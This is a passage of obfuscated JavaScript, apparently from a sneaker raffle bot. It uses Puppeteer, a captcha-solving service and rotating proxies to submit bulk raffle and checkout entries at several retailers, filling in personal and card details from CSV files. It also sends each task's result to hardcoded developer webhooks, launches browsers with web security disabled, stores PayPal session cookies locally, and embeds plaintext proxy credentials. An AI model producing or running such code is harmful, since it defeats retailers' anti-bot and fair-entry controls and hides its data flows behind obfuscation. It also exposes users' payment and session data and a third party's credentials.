        } finally {
            _0x20cd78 && _0x20cd78['close']();
            if (_0x109abd == 'yes' && _0xf3ffd0 != 0x5) {
                console['log'](_0xecbe11['red'](_0x3b5d06() + '\x20[' + _0x455650['name'] + ']\x20Task\x20' + (_0x58e900 + 0x1) + '\x20:\x20Retrying')), _0x58e900 = _0x58e900 - 0x1, _0xf3ffd0 = _0xf3ffd0 + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0x32bec3['delay'] + '\x20ms'), await _0x45ce86(_0x32bec3['delay']);
        }
    }
}
async function _0x5c43eb(_0x2b4f83, _0x52030a, _0x3ea117) {
    var _0x144109 = ![], _0x2a554e = ![];
    if (_0x32bec3['captchaKey'] == '' || _0x32bec3['captchaKey'] == undefined)
        return console['log'](_0xecbe11['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
    _0x4146a9['use'](_0xc40ee6()), _0x4146a9['use'](_0x47d0c5({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x32bec3['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x43a7e5 = 0x0; _0x43a7e5 < _0x52030a['length']; _0x43a7e5++) {
        var _0x4f5b6d, _0x721231 = [{
            'type': 'rich',
            'title': 'Succesful\x20JD\x20entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'Product',
                    'value': '' + _0x52030a[_0x43a7e5]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x52030a[_0x43a7e5]['Size']
                },
                {
                    'name': 'User',
                    'value': '' + _0x5ce999
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x32bec3['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x37a22d
                }
            ]
        }];
        const _0x485750 = { 'embeds': _0x721231 };
        _0x42c473(_0x2b4f83['name'] + '\x20Task\x20' + (_0x43a7e5 + 0x1) + '\x20/\x20' + _0x52030a['length'] + '\x20||\x20File:\x20' + _0x28b8bc + '\x20Proxies:\x20' + _0x26a868), await _0x10d7a7(_0x52030a, _0x43a7e5);
        var _0x529340 = await _0x12f7f(_0x52030a[_0x43a7e5], _0x2b4f83, 'dev', ![]), _0x39aeae = await _0x12f7f(_0x52030a[_0x43a7e5], _0x2b4f83, 'pub', ![]);
        const _0x3b0515 = {
            'succesDEVMSG': { 'embeds': [_0x529340] },
            'succesPUBMSG': { 'embeds': [_0x39aeae] }
        };
        if (_0x32bec3['webhook'] != undefined && _0x32bec3['webhook'] != '')
            try {
                await _0x32e91d(_0x32bec3['webhook'], _0x3b0515['succesDEVMSG']);
            } catch {
            }
        await _0x45ce86(0xc8), await _0x32e91d(_0x1e4a2b, _0x3b0515['succesDEVMSG']), await _0x45ce86(0xc8);
        try {
            await _0x32e91d(_0x1fcd8b, _0x3b0515['succesPUBMSG']);
        } catch {
        }
        if (_0x52030a[_0x43a7e5]['Email'] == '' || _0x52030a[_0x43a7e5]['Url'] == '' || _0x52030a[_0x43a7e5]['FirstName'] == '' || _0x52030a[_0x43a7e5]['LastName'] == '') {
            console['log'](_0x3b5d06() + '\x20[' + _0x4e2615[taskModule]['name'] + ']\x20Task\x20' + (_0x43a7e5 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x32bec3['useRandomProxy'] = ![])
            var _0x45c9ca = _0x3ea117[_0x43a7e5]['split'](':');
        else
            var _0x359c0a = Math['round'](Math['random']() * (_0x3ea117['length'] - 0x1)), _0x45c9ca = _0x3ea117[_0x359c0a]['split'](':');
        const _0x11859e = await _0x4146a9['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x45c9ca[0x0] + ':' + _0x45c9ca[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0xddc37b = await _0x11859e['newPage']();
            await _0xddc37b['authenticate']({
                'username': '' + _0x45c9ca[0x2],
                'password': '' + _0x45c9ca[0x3]
            }), console['log'](_0x3b5d06() + '\x20[' + _0x2b4f83['name'] + ']\x20Task\x20' + (_0x43a7e5 + 0x1) + '\x20:\x20Getting\x20Session'), await _0xddc37b['setRequestInterception'](!![]), _0xddc37b['on']('request', _0x25e8d5 => {
                _0x25e8d5['resourceType']() === 'image' || _0x25e8d5['resourceType']() === 'font' || _0x25e8d5['resourceType']() === 'media' ? _0x25e8d5['abort']() : _0x25e8d5['continue']();
            }), await _0xddc37b['goto']('' + _0x52030a[_0x43a7e5]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            });
            try {
                await _0xddc37b['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
            } catch {
                throw new Error('Not\x20an\x20Active\x20Raffle');
            }
            console['log'](_0x3b5d06() + '\x20[' + _0x2b4f83['name'] + ']\x20Task\x20' + (_0x43a7e5 + 0x1) + '\x20:\x20Filling\x20Information'), await _0xddc37b['type']('#comp_firstname', '' + _0x52030a[_0x43a7e5]['FirstName']), await _0xddc37b['waitForSelector']('#comp_lastname'), await _0xddc37b['type']('#comp_lastname', '' + _0x52030a[_0x43a7e5]['LastName']), await _0xddc37b['waitForSelector']('#comp_email'), await _0xddc37b['type']('#comp_email', '' + _0x52030a[_0x43a7e5]['Email']), await _0xddc37b['waitForSelector']('#comp_paypalemail'), await _0xddc37b['type']('#comp_paypalemail', '' + _0x52030a[_0x43a7e5]['Email']), await _0xddc37b['waitForSelector']('#comp_mobile_end'), await _0xddc37b['type']('#comp_mobile_end', '' + _0x52030a[_0x43a7e5]['Phone']), await _0xddc37b['waitForSelector']('#comp_dob'), await _0xddc37b['type']('#comp_dob', '08/09/1992'), console['log'](_0x3b5d06() + '\x20[' + _0x2b4f83['name'] + ']\x20Task\x20' + (_0x43a7e5 + 0x1) + '\x20:\x20Choosing\x20Size');
            if (_0x52030a[_0x43a7e5]['Size'] == 'RANDOM') {
                const _0x4eda74 = await _0xddc37b['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x3ce90d => {
                    return _0x3ce90d['map'](_0x47ea52 => _0x47ea52['value']);
                });
                var _0xc283ee = Math['round'](Math['random']() * (_0x4eda74['length'] - 0x2));
                await _0xddc37b['select']('#shoesize', _0x4eda74[_0xc283ee + 0x1]), await _0x45ce86(0x3e8);
            } else {
                const _0x51fd1f = await _0xddc37b['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x14fd1b => {
                    return _0x14fd1b['map'](_0x46ff90 => _0x46ff90['innerText']);
                }), _0x44206d = await _0xddc37b['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x54e8db => {
                    return _0x54e8db['map'](_0x212272 => _0x212272['value']);
                });
                var _0x49c561 = _0x52030a[_0x43a7e5]['Size'];
                for (var _0x36a70d = 0x1; _0x36a70d < _0x44206d['length']; _0x36a70d++) {
                    var _0x58fc32 = _0x51fd1f[_0x36a70d]['split']('\x20')[0x0];
                    if (_0x58fc32 == _0x49c561) {
                        await _0xddc37b['select']('#shoesize', _0x44206d[_0x36a70d]);
                        break;
                    } else {
                        if (_0x36a70d + 0x1 == _0x44206d['length'])
                            throw new Error('Size\x20Not\x20Found..');
                    }
                }
            }
            await _0xddc37b['waitForSelector']('#comp_address1'), await _0xddc37b['type']('#comp_address1', _0x52030a[_0x43a7e5]['Address1'] + '\x20' + _0x52030a[_0x43a7e5]['HouseNumber']), await _0xddc37b['waitForSelector']('#comp_address2'), await _0xddc37b['type']('#comp_address2', '' + _0x52030a[_0x43a7e5]['Address2']), await _0xddc37b['waitForSelector']('#comp_address2'), await _0xddc37b['type']('#comp_address3', '' + _0x52030a[_0x43a7e5]['City']), await _0xddc37b['waitForSelector']('#comp_postcode'), await _0xddc37b['type']('#comp_postcode', '' + _0x52030a[_0x43a7e5]['Zip']), console['log'](_0x3b5d06() + '\x20[' + _0x2b4f83['name'] + ']\x20Task\x20' + (_0x43a7e5 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x45ce86(0x4b0), await _0xddc37b['click']('label#emailhold'), await _0x45ce86(0x5dc), await _0xddc37b['click']('#preauth_tandc_email\x20>\x20label'), await _0x45ce86(0x5dc), await _0xddc37b['click']('#submit'), await _0xddc37b['waitForSelector']('#paymentWrap'), console['log'](_0x3b5d06() + '\x20[' + _0x2b4f83['name'] + ']\x20Task\x20' + (_0x43a7e5 + 0x1) + '\x20:\x20' + _0xecbe11['blue']('Awaiting\x20Paypal\x20Payment')), _0x11859e['on']('targetcreated', async _0x5beb24 => {
                if (_0x5beb24['type']() === 'page') {
                    const _0x35d392 = await _0x5beb24['page']();
                    async function _0x57c346() {
                        try {
                            await _0xddc37b['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x2a554e = !![];
                            return;
                        } catch {
                        }
                    }
                    async function _0x318418() {
                        try {
                            await _0xddc37b['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x144109 = !![];
                            return;
                        } catch {
                        }
                    }
                    _0x318418(), _0x57c346(), await _0x45ce86(0x493e0);
                }
            });
            async function _0x5cec11() {
                for (let _0x785217 = 0x0; _0x785217 < 0x12c; _0x785217++) {
                    if (_0x144109 == !![]) {
                        console['log'](_0xecbe11['green'](_0x3b5d06() + '\x20[' + _0x2b4f83['name'] + ']\x20Task\x20' + (_0x43a7e5 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        if (_0x32bec3['webhook'] != undefined && _0x32bec3['webhook'] != '')
                            try {
                                await _0x32e91d(_0x32bec3['webhook'], _0x3b0515['succesDEVMSG']);
                            } catch {
                            }
                        await _0x45ce86(0xc8), await _0x32e91d(_0x1e4a2b, _0x3b0515['succesDEVMSG']), await _0x45ce86(0xc8);
                        try {
                            await _0x32e91d(_0x1fcd8b, _0x3b0515['succesPUBMSG']);
                        } catch {
                        }
                        return;
                    } else {
                        if (_0x2a554e)
                            throw new Error('Paypal\x20Error:\x20Target\x20closed');
                        else
                            await _0x45ce86(0x3e8);
                    }
                }
                throw new Error('Paypal\x20Error');
            }
            await _0x45ce86(0xbb8), await _0xddc37b['click']('.zoid-outlet'), await _0x45ce86(0x7d0), await _0x5cec11();
        } catch (_0x5c3f8e) {
            console['log'](_0xecbe11['red'](_0x3b5d06() + '\x20[' + _0x2b4f83['name'] + ']\x20Task\x20' + (_0x43a7e5 + 0x1) + '\x20:\x20' + _0x5c3f8e)), _0x4f5b6d = '' + _0x5c3f8e;
            var _0x3d7c38 = await _0x12f7f(_0x52030a[_0x43a7e5], _0x2b4f83, 'dev', !![], _0x4f5b6d);
            _0x3b0515['errorDEV'] = { 'embeds': [_0x3d7c38] }, _0x32bec3['webhook'] != undefined && _0x32bec3['webhook'] != '' && await _0x32e91d(_0x32bec3['webhook'], _0x3b0515['errorDEV']), await _0x32e91d(_0x49aba5, _0x3b0515['errorDEV']);
        } finally {
            _0x11859e && _0x11859e['close'](), console['log']('Waiting\x20for\x20' + _0x32bec3['delay'] + '\x20ms'), await _0x45ce86(_0x32bec3['delay']);
        }
    }
}
async function _0x49985c(_0x4846ec, _0x2f30fc, _0x3728f4) {
    _0x4146a9['use'](_0xc40ee6()), _0x4146a9['use'](_0x47d0c5({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x32bec3['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x52a6e3 = 0x0; _0x52a6e3 < _0x2f30fc['length']; _0x52a6e3++) {
        _0x42c473(_0x4846ec['name'] + '\x20Task\x20' + (_0x52a6e3 + 0x1) + '\x20/\x20' + _0x2f30fc['length'] + '\x20||\x20File:\x20' + _0x28b8bc + '\x20Proxies:\x20' + _0x26a868);
        var _0x1da30d = [{
            'type': 'rich',
            'title': 'Succesful\x20SevenStore\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x5ce999
                },
                {
                    'name': 'Product',
                    'value': '' + _0x2f30fc[_0x52a6e3]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x2f30fc[_0x52a6e3]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x32bec3['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x32bec3['version']
                }
            ]
        }];
        const _0xcf005 = { 'embeds': _0x1da30d };
        await _0x10d7a7(_0x2f30fc, _0x52a6e3);
        if (_0x2f30fc[_0x52a6e3]['Email'] == '' || _0x2f30fc[_0x52a6e3]['Password'] == '' || _0x2f30fc[_0x52a6e3]['FirstName'] == '' || _0x2f30fc[_0x52a6e3]['LastName'] == '') {
            console['log'](_0x3b5d06() + '\x20[' + _0x4846ec['name'] + ']\x20Task\x20' + (_0x52a6e3 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        (_0x2f30fc[_0x52a6e3]['Password'] == '' || _0x2f30fc[_0x52a6e3]['Password'] == undefined) && (_0x2f30fc[_0x52a6e3]['Password'] = 'ErehsaWonRaj1!');
        if (_0x32bec3['useRandomProxy'] = ![])
            var _0x43b599 = _0x3728f4[_0x52a6e3]['split'](':');
        else
            var _0x53733d = Math['round'](Math['random']() * (_0x3728f4['length'] - 0x1)), _0x43b599 = _0x3728f4[_0x53733d]['split'](':');
        const _0x53dae5 = await _0x4146a9['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x43b599[0x0] + ':' + _0x43b599[0x1],
                '--no-sandbox',
                '--incognito',
                '--disable-web-security',
                '--disable-features=IsolateOrigins',
                '\x20--disable-site-isolation-trials',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x28708c = await _0x53dae5['newPage']();
            await _0x28708c['authenticate']({
                'username': '' + _0x43b599[0x2],
                'password': '' + _0x43b599[0x3]
            }), console['log'](_0x3b5d06() + '\x20[' + _0x4846ec['name'] + ']\x20Task\x20' + (_0x52a6e3 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x28708c['setRequestInterception'](!![]), _0x28708c['on']('request', _0x1385a0 => {
                _0x1385a0['resourceType']() === 'image' || _0x1385a0['resourceType']() === 'font' || _0x1385a0['resourceType']() === 'media' ? _0x1385a0['abort']() : _0x1385a0['continue']();
            }), await _0x28708c['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            }), await _0x28708c['goto']('' + _0x2f30fc[_0x52a6e3]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0x1d4c0
            }), await _0x28708c['waitForSelector']('#btnPdpAtb'), console['log'](_0x3b5d06() + '\x20[' + _0x4846ec['name'] + ']\x20Task\x20' + (_0x52a6e3 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x2f30fc[_0x52a6e3]['Size']);
            const _0x531a6d = await _0x28708c['$$eval']('div.pointer.pdpsizeoption.f-12.f-color3', _0x1fe98c => {
                return _0x1fe98c['map'](_0x5b78ce => _0x5b78ce['innerText']);
            }), _0x434bdb = await _0x28708c['$$']('div.pointer.pdpsizeoption.f-12.f-color3'), _0x57a5e5 = ![];
            if (_0x2f30fc[_0x52a6e3]['Size'] == 'RANDOM') {
                var _0x6944ea = Math['round'](Math['random']() * (_0x434bdb['length'] - 0x1));
                await _0x434bdb[_0x6944ea]['click']();
            } else
                for (var _0x1cd1b0 = 0x0; _0x1cd1b0 < _0x531a6d['length']; _0x1cd1b0++) {
                    if (_0x531a6d[_0x1cd1b0] != _0x2f30fc[_0x52a6e3]['Size'])
                        continue;
                    try {
                        await _0x434bdb[_0x1cd1b0]['click']();
                    } catch {
                        console['log'](_0xecbe11['red'](_0x3b5d06() + '\x20[' + _0x4846ec['name'] + ']\x20Task\x20' + (_0x52a6e3 + 0x1) + '\x20:\x20Size\x20Not\x20Found')), _0x57a5e5 = !![];
                    }
                }
            if (_0x57a5e5)
                continue;
            await _0x45ce86(0x578), await _0x28708c['click']('#btnPdpAtb'), await _0x28708c['waitForSelector']('.fa.fa-check-circle.f-color8.f-30.valign-middle-important'), await _0x45ce86(0x3e8), console['log'](_0x3b5d06() + '\x20[' + _0x4846ec['name'] + ']\x20Task\x20' + (_0x52a6e3 + 0x1) + '\x20:\x20Getting\x20Checkout\x20Session'), await _0x28708c['goto']('https://www.sevenstore.com/login/?target=checkout'), await _0x28708c['waitForSelector']('#email'), await _0x28708c['type']('#email', _0x2f30fc[_0x52a6e3]['Email']), await _0x45ce86(0x226), await _0x28708c['click']('#guest-submit'), await _0x45ce86(0x1b58), console['log'](_0x3b5d06() + '\x20[' + _0x4846ec['name'] + ']\x20Task\x20' + (_0x52a6e3 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x28708c['waitForSelector']('#firstname'), await _0x28708c['type']('#firstname', _0x2f30fc[_0x52a6e3]['FirstName'], 0x1f4), await _0x45ce86(0x190), await _0x28708c['waitForSelector']('#surname'), await _0x28708c['type']('#surname', _0x2f30fc[_0x52a6e3]['LastName'], 0x1f4), await _0x45ce86(0x190), await _0x28708c['waitForSelector']('#mobile'), await _0x28708c['type']('#mobile', _0x2f30fc[_0x52a6e3]['Phone'], 0x1f4), await _0x45ce86(0x190), await _0x28708c['click']('#enterManualDiv'), await _0x45ce86(0x5dc), await _0x28708c['waitForSelector']('#address1'), await _0x28708c['type']('#address1', _0x2f30fc[_0x52a6e3]['Address1'] + '\x20' + _0x2f30fc[_0x52a6e3]['HouseNumber'], 0x226), await _0x45ce86(0x384), await _0x28708c['waitForSelector']('#address2'), await _0x28708c['type']('#address2', '' + _0x2f30fc[_0x52a6e3]['Address2'], 0x226), await _0x45ce86(0x320);
            const _0x4d15b5 = await _0x28708c['$$eval']('#countryselect_view3\x20>\x20option', _0x72ebf7 => {
                return _0x72ebf7['map'](_0x105aba => _0x105aba['value']);
            });
            var _0x1ad13a;
            for (var _0x3ce98c = 0x0; _0x3ce98c < _0x4d15b5['length']; _0x3ce98c++) {
                if (_0x4d15b5[_0x3ce98c]['startsWith']('' + _0x2f30fc[_0x52a6e3]['Country'])) {
                    _0x1ad13a = _0x4d15b5[_0x3ce98c];
                    break;
                }
                continue;
            }
            await _0x28708c['select']('#countryselect_view3', '' + _0x1ad13a), await _0x28708c['waitForSelector']('#address4'), await _0x28708c['type']('#address4', '' + _0x2f30fc[_0x52a6e3]['City'], 0x1f4), await _0x45ce86(0x384), await _0x28708c['waitForSelector']('#postcode'), await _0x28708c['type']('#postcode', '' + _0x2f30fc[_0x52a6e3]['Zip'], 0x1f4), await _0x45ce86(0x4b0);
            const _0x291968 = await _0x28708c['url']();
            console['log'](_0x3b5d06() + '\x20[' + _0x4846ec['name'] + ']\x20Task\x20' + (_0x52a6e3 + 0x1) + '\x20:\x20Submitting\x20Entry');
            const _0x6a869e = _0x291968['split']('?')[0x1], _0x141b63 = await _0x28708c['$']('#co_address_submit');
            await _0x141b63['evaluate'](_0x3e1aad => _0x3e1aad['click']()), await _0x45ce86(0x1388), await _0x28708c['goto']('https://www.sevenstore.com/checkout/pay/?' + _0x6a869e), console['log'](_0x3b5d06() + '\x20[' + _0x4846ec['name'] + ']\x20Task\x20' + (_0x52a6e3 + 0x1) + '\x20:\x20Getting\x20Payment\x20session'), await _0x28708c['waitForSelector']('#paymentbuttons'), await _0x45ce86(0x1388), await _0x28708c['click']('#paymentbuttons\x20>\x20div'), await _0x45ce86(0x1c2), await _0x28708c['waitForSelector']('#card-number'), await _0x28708c['waitForSelector']('#card-number\x20>\x20div\x20>\x20iframe');
            const _0x28099e = await _0x28708c['$']('#card-number\x20>\x20div\x20>\x20iframe'), _0x43ae8b = await _0x28099e['contentFrame']();
            await _0x43ae8b['waitForSelector']('.InputContainer'), await _0x43ae8b['click']('.InputContainer\x20>\x20input'), await _0x45ce86(0x578), await _0x28708c['type']('#card-number', '' + _0x2f30fc[_0x52a6e3]['CreditNumber']), await _0x45ce86(0xfa), await _0x28708c['type']('#card-expiry', '' + _0x2f30fc[_0x52a6e3]['ExpiryDate']), await _0x45ce86(0xfa), await _0x28708c['type']('#card-cvc', '' + _0x2f30fc[_0x52a6e3]['CVV']), await _0x45ce86(0x7d0), await _0x28708c['click']('#card-button'), console['log'](_0x3b5d06() + '\x20[' + _0x4846ec['name'] + ']\x20Task\x20' + (_0x52a6e3 + 0x1) + '\x20:\x20Awaiting\x203DS');
            try {
                await _0x28708c['waitForSelector']('.btn-auxilliary.btn-sub.fullwidth', { 'timeout': 0x493e0 }), console['log'](_0xecbe11['green'](_0x3b5d06() + '\x20[' + _0x4846ec['name'] + ']\x20Task\x20' + (_0x52a6e3 + 0x1) + '\x20:\x20Raffle\x20Entered!')), await _0x32e91d(_0x1e4a2b, _0xcf005);
            } catch {
                console['log'](_0xecbe11['red'](_0x3b5d06() + '\x20[' + _0x4846ec['name'] + ']\x20Task\x20' + (_0x52a6e3 + 0x1) + '\x20:\x203DS\x20Failed')), _0x1da30d[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x1da30d[0x0]['description'] = '3DS\x20Failed', await _0x32e91d(_0x49aba5, _0xcf005);
            }
        } catch (_0x46dfec) {
            console['log'](_0xecbe11['red'](_0x3b5d06() + '\x20[' + _0x4846ec['name'] + ']\x20Task\x20' + (_0x52a6e3 + 0x1) + '\x20:\x20' + _0x46dfec)), _0x1da30d[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x1da30d[0x0]['description'] = '' + _0x46dfec, await _0x32e91d(_0x49aba5, _0xcf005);
        } finally {
            _0x53dae5 && _0x53dae5['close']();
            if (_0x52a6e3 + 0x1 == _0x2f30fc['length']) {
                console['log'](_0xecbe11['green']('Finished\x20tasks,\x20returning\x20to\x20Main\x20Menu')), await _0x45ce86(0x7d0);
                break;
            }
            console['log']('Waiting\x20for\x20' + _0x32bec3['AfewDelay'] + '\x20ms'), await _0x45ce86(_0x32bec3['AfewDelay']);
        }
    }
}
async function _0x6f9798(_0x2c7f5f, _0x5357bc, _0x5d1698, _0x13ab29, _0x16174f) {
    var _0x30f6b3, _0x100746 = {}, _0x195d4e = [], _0x2a9126 = {}, _0x518355 = [
        '40',
        '40,5',
        '41',
        '42',
        '42,5',
        '43',
        '44',
        '45',
        '45,5',
        '46',
        '47',
        '47,5',
        '48'
    ];
    !_0x13ab29 && (_0x13ab29 = {});
    if (_0x5357bc != 'ver') {
        _0x42c473(_0x5d1698['name'] + '\x20Task\x20' + (_0x2c7f5f + 0x1) + '\x20/\x20' + _0x13ab29['length'] + '\x20||\x20File:\x20' + _0x28b8bc + '\x20Proxies:\x20' + _0x26a868), await _0x10d7a7(_0x13ab29, _0x2c7f5f), _0x195d4e = [{
            'type': 'rich',
            'title': 'Succesful\x20OQIUM\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x5ce999
                },
                {
                    'name': 'Size',
                    'value': '' + _0x13ab29[_0x2c7f5f]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x32bec3['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x37a22d
                }
            ]
        }], _0x2a9126 = { 'embeds': _0x195d4e }, _0x100746 = _0x5d1698['data'];
        _0x5357bc == 'exp' ? _0x100746['data']['attributes']['email'] = '' + _0x13ab29[_0x2c7f5f]['FirstName'] + _0x13ab29[_0x2c7f5f]['LastName'] + _0x32bec3['catchall'] : _0x100746['data']['attributes']['email'] = '' + _0x13ab29[_0x2c7f5f]['Email'];
        if (_0x13ab29[_0x2c7f5f]['Size'] == 'RANDOM') {
        }
        _0x100746['data']['attributes']['properties']['$first_name'] = '' + _0x13ab29[_0x2c7f5f]['FirstName'], _0x100746['data']['attributes']['properties']['$last_name'] = '' + _0x13ab29[_0x2c7f5f]['LastName'], _0x100746['data']['attributes']['properties']['$address1'] = _0x13ab29[_0x2c7f5f]['Address1'] + '\x20' + _0x13ab29[_0x2c7f5f]['Address2'] + '\x20' + _0x13ab29[_0x2c7f5f]['HouseNumber'], _0x100746['data']['attributes']['properties']['$zip'] = '' + _0x13ab29[_0x2c7f5f]['Zip'], _0x100746['data']['attributes']['properties']['$city'] = '' + _0x13ab29[_0x2c7f5f]['City'], _0x100746['data']['attributes']['properties']['$country'] = '' + _0x13ab29[_0x2c7f5f]['Country'], _0x100746['data']['attributes']['properties']['Size'] = '' + _0x13ab29[_0x2c7f5f]['Size'], _0x100746['data']['attributes']['properties']['$phone_number'] = '' + _0x13ab29[_0x2c7f5f]['Phone'], _0x100746['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x13ab29[_0x2c7f5f]['Follower'];
    }
    if (_0x32bec3['useRandomProxy'] = ![])
        var _0x44b3cb = _0x16174f[_0x2c7f5f]['split'](':');
    else
        var _0x2c8b24 = Math['round'](Math['random']() * (_0x16174f['length'] - 0x1)), _0x44b3cb = _0x16174f[_0x2c8b24]['split'](':');
    var _0x507a3d = {
        'jar': _0x5d7c39,
        'followAllRedirects': !![],
        'method': 'POST',
        'url': _0x5d1698['url'],
        'headers': _0x5d1698['headers'],
        'body': JSON['stringify'](_0x100746),
        'proxy': 'http://' + _0x44b3cb[0x2] + ':' + _0x44b3cb[0x3] + '@' + _0x44b3cb[0x0] + ':' + _0x44b3cb[0x1]
    };
    return _0x5357bc != 'ver' && (_0x507a3d['url'] = _0x5d1698['url'], _0x507a3d['headers'] = _0x5d1698['headers']), _0x5357bc == 'ver' && (_0x507a3d['method'] = 'GET'), new Promise(function (_0xcec3df, _0x55e315) {
        callback = async (_0x475b8b, _0x21ed2a, _0x5a93e0) => {
            if (!_0x475b8b && _0x21ed2a['statusCode'] == 0xca || !_0x475b8b && _0x21ed2a['statusCode'] == 0xc8) {
                if (_0x5357bc != 'ver') {
                    var _0x10479d = await _0x12f7f(_0x13ab29[_0x2c7f5f], _0x5d1698, 'dev', ![]), _0x961519 = await _0x12f7f(_0x13ab29[_0x2c7f5f], _0x5d1698, 'pub', ![]);
                    const _0x228e50 = {
                        'succesDEVMSG': { 'embeds': [_0x10479d] },
                        'succesPUBMSG': { 'embeds': [_0x961519] }
                    };
                    if (_0x32bec3['webhook'] != undefined && _0x32bec3['webhook'] != '')
                        try {
                            await _0x32e91d(_0x32bec3['webhook'], _0x228e50['succesDEVMSG']);
                        } catch {
                        }
                    await _0x45ce86(0xc8), await _0x32e91d(_0x1e4a2b, _0x228e50['succesDEVMSG']), await _0x45ce86(0xc8);
                    try {
                        await _0x32e91d(_0x1fcd8b, _0x228e50['succesPUBMSG']);
                    } catch {
                    }
                }
                _0xcec3df(console['log'](_0xecbe11['green'](_0x3b5d06() + '\x20[' + _0x5d1698['name'] + ']\x20Task\x20' + (_0x2c7f5f + 0x1) + ':\x20Raffle\x20Entered!')));
            } else {
                if (_0x5357bc != 'ver') {
                    var _0x43de9f = '' + _0x475b8b, _0x4e6b0c = await _0x12f7f(_0x13ab29[_0x2c7f5f], _0x5d1698, 'dev', !![], _0x43de9f), _0x525bfd = {};
                    _0x525bfd['errorDEV'] = { 'embeds': [_0x4e6b0c] }, _0x32bec3['webhook'] != undefined && _0x32bec3['webhook'] != '' && await _0x32e91d(_0x32bec3['webhook'], _0x525bfd['errorDEV']), await _0x32e91d(_0x49aba5, _0x525bfd['errorDEV']);
                }
                _0x55e315(console['log'](_0x3b5d06() + '\x20[' + _0x5d1698['name'] + ']\x20Task\x20' + (_0x2c7f5f + 0x1) + ':\x20' + _0x475b8b));
            }
        };
        try {
            _0x5357bc != 'ver' && console['log'](_0x3b5d06() + '\x20[' + _0x5d1698['name'] + ']\x20Task\x20' + (_0x2c7f5f + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x100746['data']['attributes']['email']), _0x2b8b28(_0x507a3d, callback);
        } catch (_0x2427a7) {
            console['log'](_0x3b5d06() + '\x20Task\x20' + (_0x2c7f5f + 0x1) + ':\x20' + _0x2427a7);
        }
    });
}
;
async function _0x5dbc4c(_0x3395f6, _0x6c0f63, _0x541165) {
    var _0x33ef61;
    _0x42c473('' + _0x6c0f63);
    var _0xa501b6 = '194.135.23.69:50320:jarno3001:aeyfv0dg'['split'](':');
    const _0x32726b = await _0x4146a9['launch']({
        'headless': ![],
        'args': [
            '--proxy-server=' + _0xa501b6[0x0] + ':' + _0xa501b6[0x1],
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-web-security',
            '--disable-features=IsolateOrigins',
            '\x20--disable-site-isolation-trials'
        ]
    });
    try {
        console['log'](_0x3b5d06() + '\x20[' + _0x6c0f63 + ']\x20Getting\x20Session');
        const _0x1ee083 = JSON['parse'](_0x5e836d['readFileSync']('sessions/log.json')), _0x5927d7 = await _0x32726b['newPage']();
        await _0x5927d7['authenticate']({
            'username': '' + _0xa501b6[0x2],
            'password': '' + _0xa501b6[0x3]
        }), await _0x5927d7['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x5927d7, await _0x5927d7['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x3b5d06() + '\x20[' + _0x6c0f63 + ']\x20Log\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x5927d7['waitForSelector']('#cwBalance', { 'timeout': 0x493e0 }), console['log'](_0x3b5d06() + '\x20[' + _0x6c0f63 + ']\x20Successfully\x20logged\x20in'), await _0x45ce86(0x2710), _0x33ef61 = await _0x5927d7['cookies'](), _0x5e836d['writeFileSync']('sessions/log.json', '' + JSON['stringify'](_0x33ef61));
        } catch (_0x292f6f) {
            throw new Error('Login\x20session\x20expired\x20' + _0x292f6f);
        }
        for (var _0x4eba23 = 0x0; _0x4eba23 < _0x3395f6['length']; _0x4eba23++) {
            console['log'](_0x3b5d06() + '\x20[' + _0x6c0f63 + ']\x20Task\x20' + (_0x4eba23 + 0x1) + '\x20:\x20Starting\x20Verification'), _0x42c473(_0x6c0f63 + '\x20Task\x20' + (_0x4eba23 + 0x1) + '\x20/\x20' + _0x3395f6['length']);
            const _0x493629 = await _0x32726b['newPage']();
